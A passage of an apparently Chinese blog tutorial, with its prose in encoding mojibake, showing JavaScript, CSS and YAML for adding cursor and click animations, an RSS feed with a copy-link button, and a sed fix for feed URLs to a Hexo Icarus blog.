class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> <span class="title function_">fairyDustCursor</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> possibleColors = [<span class="string">&quot;#D61C59&quot;</span>, <span class="string">&quot;#E7D84B&quot;</span>, <span class="string">&quot;#1B8798&quot;</span>]</span><br><span class="line">    <span class="keyword">var</span> width = <span class="variable language_">window</span>.<span class="property">innerWidth</span>;</span><br><span class="line">    <span class="keyword">var</span> height = <span class="variable language_">window</span>.<span class="property">innerHeight</span>;</span><br><span class="line">    <span class="keyword">var</span> cursor = &#123; <span class="attr">x</span>: width / <span class="number">2</span>, <span class="attr">y</span>: width / <span class="number">2</span> &#125;;</span><br><span class="line">    <span class="keyword">var</span> particles = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">bindEvents</span>();</span><br><span class="line">        <span class="title function_">loop</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bind events that are needed</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">bindEvents</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousemove&#x27;</span>, onMouseMove);</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;touchmove&#x27;</span>, onTouchMove);</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;touchstart&#x27;</span>, onTouchMove);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;resize&#x27;</span>, onWindowResize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">onWindowResize</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        width = <span class="variable language_">window</span>.<span class="property">innerWidth</span>;</span><br><span class="line">        height = <span class="variable language_">window</span>.<span class="property">innerHeight</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">onTouchMove</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">touches</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; e.<span class="property">touches</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                <span class="title function_">addParticle</span>(e.<span class="property">touches</span>[i].<span class="property">clientX</span>, e.<span class="property">touches</span>[i].<span class="property">clientY</span>, possibleColors[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * possibleColors.<span class="property">length</span>)]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">onMouseMove</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        cursor.<span class="property">x</span> = e.<span class="property">clientX</span>;</span><br><span class="line">        cursor.<span class="property">y</span> = e.<span class="property">clientY</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_">addParticle</span>(cursor.<span class="property">x</span>, cursor.<span class="property">y</span>, possibleColors[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * possibleColors.<span class="property">length</span>)]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">addParticle</span>(<span class="params">x, y, color</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> particle = <span class="keyword">new</span> <span class="title class_">Particle</span>();</span><br><span class="line">        particle.<span class="title function_">init</span>(x, y, color);</span><br><span class="line">        particles.<span class="title function_">push</span>(particle);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">updateParticles</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; particles.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            particles[i].<span class="title function_">update</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = particles.<span class="property">length</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (particles[i].<span class="property">lifeSpan</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                particles[i].<span class="title function_">die</span>();</span><br><span class="line">                particles.<span class="title function_">splice</span>(i, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">loop</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">requestAnimationFrame</span>(loop);</span><br><span class="line">        <span class="title function_">updateParticles</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">Particle</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">character</span> = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">lifeSpan</span> = <span class="number">120</span>; <span class="comment">//ms</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">initialStyles</span> = &#123;</span><br><span class="line">            <span class="string">&quot;position&quot;</span>: <span class="string">&quot;fixed&quot;</span>,</span><br><span class="line">            <span class="string">&quot;top&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="comment">//å¿…é¡»åŠ </span></span><br><span class="line">            <span class="string">&quot;display&quot;</span>: <span class="string">&quot;block&quot;</span>,</span><br><span class="line">            <span class="string">&quot;pointerEvents&quot;</span>: <span class="string">&quot;none&quot;</span>,</span><br><span class="line">            <span class="string">&quot;z-index&quot;</span>: <span class="string">&quot;10000000&quot;</span>,</span><br><span class="line">            <span class="string">&quot;fontSize&quot;</span>: <span class="string">&quot;20px&quot;</span>,</span><br><span class="line">            <span class="string">&quot;will-change&quot;</span>: <span class="string">&quot;transform&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">init</span> = <span class="keyword">function</span> (<span class="params">x, y, color</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">velocity</span> = &#123;</span><br><span class="line">                <span class="attr">x</span>: (<span class="title class_">Math</span>.<span class="title function_">random</span>() &lt; <span class="number">0.5</span> ? -<span class="number">1</span> : <span class="number">1</span>) * (<span class="title class_">Math</span>.<span class="title function_">random</span>() / <span class="number">2</span>),</span><br><span class="line">                <span class="attr">y</span>: <span class="number">1</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">position</span> = &#123; <span class="attr">x</span>: x - <span class="number">10</span>, <span class="attr">y</span>: y - <span class="number">20</span> &#125;;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">initialStyles</span>.<span class="property">color</span> = color;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(color);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">element</span> = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;span&#x27;</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">element</span>.<span class="property">innerHTML</span> = <span class="variable language_">this</span>.<span class="property">character</span>;</span><br><span class="line">            <span class="title function_">applyProperties</span>(<span class="variable language_">this</span>.<span class="property">element</span>, <span class="variable language_">this</span>.<span class="property">initialStyles</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">update</span>();</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(<span class="variable language_">this</span>.<span class="property">element</span>);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">update</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">position</span>.<span class="property">x</span> += <span class="variable language_">this</span>.<span class="property">velocity</span>.<span class="property">x</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">position</span>.<span class="property">y</span> += <span class="variable language_">this</span>.<span class="property">velocity</span>.<span class="property">y</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">lifeSpan</span>--;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">element</span>.<span class="property">style</span>.<span class="property">transform</span> = <span class="string">&quot;translate3d(&quot;</span> + <span class="variable language_">this</span>.<span class="property">position</span>.<span class="property">x</span> + <span class="string">&quot;px,&quot;</span> + <span class="variable language_">this</span>.<span class="property">position</span>.<span class="property">y</span> + <span class="string">&quot;px,0) scale(&quot;</span> + (<span class="variable language_">this</span>.<span class="property">lifeSpan</span> / <span class="number">120</span>) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">die</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">element</span>.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(<span class="variable language_">this</span>.<span class="property">element</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">applyProperties</span>(<span class="params">target, properties</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> properties) &#123;</span><br><span class="line">            target.<span class="property">style</span>[key] = properties[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">init</span>();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹<code>node_modules/hexo-theme-icarus/layout</code>ä¸‹çš„<code>layout.jsx</code>ï¼Œåœ¨bodyä¸­å¼•ç”¨è¿™ä¸ªjsæ–‡ä»¶</p><figure class="highlight html"><figcaption><span>node_modules/hexo-theme-icarus/layout/layout.jsx</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/home/js/fairyDustCursor.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ç‚¹å‡»ç‰¹æ•ˆ"><a href="#ç‚¹å‡»ç‰¹æ•ˆ" class="headerlink" title="ç‚¹å‡»ç‰¹æ•ˆ"></a>ç‚¹å‡»ç‰¹æ•ˆ</h2><p>ç¼–å†™äº§ç”Ÿç‚¹å‡»ç‰¹æ•ˆçš„jsæ–‡ä»¶</p><figure class="highlight js"><figcaption><span>source/js/textPopup.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> colors = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;#FF0000&quot;</span>,<span class="string">&quot;#FF7F00&quot;</span>,<span class="string">&quot; #FFFF00&quot;</span>,<span class="string">&quot;#00FF00&quot;</span>,<span class="string">&quot;#00FFFF&quot;</span>,<span class="string">&quot;#0000FF&quot;</span>,<span class="string">&quot;#8B00FF&quot;</span>,<span class="string">&quot;#FF0000&quot;</span>,<span class="string">&quot;#FF7F00&quot;</span>,<span class="string">&quot; #FFFF00&quot;</span>,<span class="string">&quot;#00FF00&quot;</span>,<span class="string">&quot;#00FFFF&quot;</span>,<span class="string">&quot;#0000FF&quot;</span>,<span class="string">&quot;#8B00FF&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> fnTextPopup = <span class="keyword">function</span> (<span class="params">arr, options</span>) &#123;</span><br><span class="line">    <span class="comment">// arrå‚æ•°æ˜¯å¿…é¡»çš„</span></span><br><span class="line">    <span class="keyword">if</span> (!arr || !arr.<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ä¸»é€»è¾‘</span></span><br><span class="line">    <span class="keyword">var</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> x = event.<span class="property">pageX</span>, y = event.<span class="property">pageY</span>;</span><br><span class="line">        <span class="keyword">var</span> eleText = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;span&#x27;</span>);</span><br><span class="line">        eleText.<span class="property">className</span> = <span class="string">&#x27;text-popup&#x27;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">appendChild</span>(eleText);</span><br><span class="line">        <span class="keyword">if</span> (arr[index]) &#123;</span><br><span class="line">            eleText.<span class="property">innerHTML</span> = arr[index];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            index = <span class="number">0</span>;</span><br><span class="line">            eleText.<span class="property">innerHTML</span> = arr[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// åŠ¨ç”»ç»“æŸååˆ é™¤è‡ªå·±</span></span><br><span class="line">        eleText.<span class="title function_">addEventListener</span>(<span class="string">&#x27;animationend&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            eleText.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(eleText);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// ä½ç½®</span></span><br><span class="line">        eleText.<span class="property">style</span>.<span class="property">left</span> = (x - eleText.<span class="property">clientWidth</span> / <span class="number">2</span>) + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">        eleText.<span class="property">style</span>.<span class="property">top</span> = (y - eleText.<span class="property">clientHeight</span>) + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">        <span class="comment">//è®¾ç½®é¢œè‰²</span></span><br><span class="line">        eleText.<span class="property">style</span>.<span class="property">color</span> = colors[index%<span class="number">14</span>]</span><br><span class="line">        <span class="comment">// indexé€’å¢</span></span><br><span class="line">        index++;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fnTextPopup</span>([<span class="string">&#x27;å¯Œå¼º&#x27;</span>, <span class="string">&#x27;æ°‘ä¸»&#x27;</span>, <span class="string">&#x27;æ–‡æ˜&#x27;</span>, <span class="string">&#x27;å’Œè°&#x27;</span>, <span class="string">&#x27;è‡ªç”±&#x27;</span>, <span class="string">&#x27;å¹³ç­‰&#x27;</span>, <span class="string">&#x27;å…¬æ­£&#x27;</span>, <span class="string">&#x27;æ³•æ²»&#x27;</span>, <span class="string">&#x27;çˆ±å›½&#x27;</span>, <span class="string">&#x27;æ•¬ä¸š&#x27;</span>, <span class="string">&#x27;è¯šä¿¡&#x27;</span>, <span class="string">&#x27;å‹å–„&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>ç¼–å†™cssæ–‡ä»¶</p><figure class="highlight css"><figcaption><span>source/css/textPopup.css</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.text-popup</span> &#123;</span><br><span class="line">    <span class="attribute">animation</span>: textPopup <span class="number">1s</span>;</span><br><span class="line">    user-select: none;</span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">99</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> textPopup &#123;</span><br><span class="line">    <span class="number">0%</span>, <span class="number">100%</span> &#123;</span><br><span class="line">        <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="number">5%</span> &#123;</span><br><span class="line">        <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="number">100%</span> &#123;</span><br><span class="line">        <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-<span class="number">50px</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨layout.jsxä¸­å¼•ç”¨</p><figure class="highlight html"><figcaption><span>node_modules/hexo-theme-icarus/layout/layout.jsx</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/home/css/textPopup.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/home/js/textPopup.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="RSSç”Ÿæˆæ’ä»¶ï¼Œå¢åŠ RSSè®¢é˜…æŒ‰é’®"><a href="#RSSç”Ÿæˆæ’ä»¶ï¼Œå¢åŠ RSSè®¢é˜…æŒ‰é’®" class="headerlink" title="RSSç”Ÿæˆæ’ä»¶ï¼Œå¢åŠ RSSè®¢é˜…æŒ‰é’®"></a>RSSç”Ÿæˆæ’ä»¶ï¼Œå¢åŠ RSSè®¢é˜…æŒ‰é’®</h2><ul><li>å®‰è£…ä¸€ä¸ªæ’ä»¶ï¼Œç”¨æ¥ç”Ÿæˆatom.xmlæ–‡ä»¶</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-generator-feed</span><br></pre></td></tr></table></figure><ul><li>é…ç½®æ’ä»¶<ul><li>headä¸‹å¢åŠ rssé…ç½®<figure class="highlight yaml"><figcaption><span>_config.icarus.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">head:</span></span><br><span class="line">    <span class="attr">rss:</span> <span class="string">/atom.xml</span></span><br></pre></td></tr></table></figure></li><li>å¢åŠ å¯¹æ’ä»¶çš„é…ç½®<figure class="highlight yaml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="attr">plugins:</span></span><br><span class="line">    <span class="string">hexo-generator-feed</span></span><br><span class="line"><span class="comment">#Feed Atom</span></span><br><span class="line"><span class="attr">feed:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">atom</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">atom.xml</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">20</span></span><br><span class="line"><span class="attr">rss:</span> <span class="string">/atom.xml</span></span><br></pre></td></tr></table></figure></li><li>é…ç½®RSSæŒ‰é’®<figure class="highlight yaml"><figcaption><span>_config.icarus.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">social_links:</span></span><br><span class="line">    <span class="attr">RSS:</span></span><br><span class="line">        <span class="attr">icon:</span> <span class="string">fa</span> <span class="string">fa-rss</span></span><br><span class="line">        <span class="attr">url:</span> <span class="string">/atom.xml</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="ä¼˜åŒ–RSSæŒ‰é’®"><a href="#ä¼˜åŒ–RSSæŒ‰é’®" class="headerlink" title="ä¼˜åŒ–RSSæŒ‰é’®"></a>ä¼˜åŒ–RSSæŒ‰é’®</h3><p>ä¸Šé¢é…ç½®ç‚¹å‡»rssæŒ‰é’®ï¼Œå¦‚æœæµè§ˆå™¨æ²¡æœ‰å®‰è£…rssç›¸å…³æ’ä»¶ï¼Œä¼šç›´æ¥æ˜¾ç¤ºatom.xmlçš„åŸå§‹æ ·å¼ï¼Œä¸ç¾è§‚ï¼Œåˆ©ç”¨jså®ç°ç‚¹å‡»rssæŒ‰é’®å°†è®¢é˜…é“¾æ¥å¤åˆ¶åˆ°å‰ªåˆ‡æ¿</p><figure class="highlight js"><figcaption><span>source/js/clickClipBoard.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copyToClipboard</span>(<span class="params">text, callBack</span>) &#123;</span><br><span class="line">    navigator.<span class="property">clipboard</span>.<span class="title function_">writeText</span>(text).<span class="title function_">then</span>(</span><br><span class="line">        <span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// fulfillment</span></span><br><span class="line">            <span class="title function_">callBack</span>()</span><br><span class="line">        &#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// rejection</span></span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;fail: &quot;</span> + reason)</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> buttons = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;button&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; buttons.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (buttons[i].<span class="title function_">getAttribute</span>(<span class="string">&quot;title&quot;</span>) == <span class="string">&quot;RSS&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> url = <span class="variable language_">document</span>.<span class="property">baseURI</span> + <span class="string">&quot;atom.xml&quot;</span></span><br><span class="line">            buttons[i].<span class="property">href</span> = <span class="string">&quot;javascript:;&quot;</span></span><br><span class="line">            buttons[i].<span class="property">target</span> = <span class="string">&quot;_self&quot;</span></span><br><span class="line">            buttons[i].<span class="title function_">setAttribute</span>(<span class="string">&#x27;onclick&#x27;</span>, <span class="string">&quot;copyToClipboard(\&quot;&quot;</span> + url + <span class="string">&quot;\&quot;, function() &#123; alert(\&quot;copied to clipboard\&quot;) &#125;)&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="ä¿®å¤æ’ä»¶çš„é—®é¢˜"><a href="#ä¿®å¤æ’ä»¶çš„é—®é¢˜" class="headerlink" title="ä¿®å¤æ’ä»¶çš„é—®é¢˜"></a>ä¿®å¤æ’ä»¶çš„é—®é¢˜</h3><ul><li>æ’ä»¶ç”Ÿæˆçš„xmlæ–‡ä»¶ä¸­ï¼Œåšå®¢çš„baseUrlä¸å¯¹ï¼Œåº”è¯¥æ˜¯<code>jingtianer.github.io</code> å®ƒç”Ÿæˆçš„æ˜¯<code>github.com/jingtianer</code></li><li>ç”Ÿæˆåä½¿ç”¨è„šæœ¬æ›¿æ¢</li></ul><blockquote><p>å…¶å®æ˜¯é…ç½®æ–‡ä»¶é‡Œå†™é”™äº†</p></blockquote><figure class="highlight sh"><figcaption><span>deploy.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/github.com\/jingtianer/jingtianer.github.io/g&#x27;</span> public/atom.xml</span><br></pre></td></tr></table></figure><h2 id="ä»£ç å—å¤åˆ¶æŒ‰é’®ä¼˜åŒ–"><a href="#ä»£ç å—å¤åˆ¶æŒ‰é’®ä¼˜åŒ–" class="headerlink" title="ä»£ç å—å¤åˆ¶æŒ‰é’®ä¼˜åŒ–"></a>ä»£ç å—å¤åˆ¶æŒ‰é’®ä¼˜åŒ–</h2><ul><li>icarusçš„ä»£ç å—å¤åˆ¶æŒ‰é’®ç‚¹å‡»ååªä¼šé€‰ä¸­ä»£ç ï¼Œå¸Œæœ›ç‚¹å‡»åèƒ½è‡ªåŠ¨å¤åˆ¶åˆ°å‰ªåˆ‡æ¿</li></ul><figure class="highlight js"><figcaption><span>source/js/clickClipBoard.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title 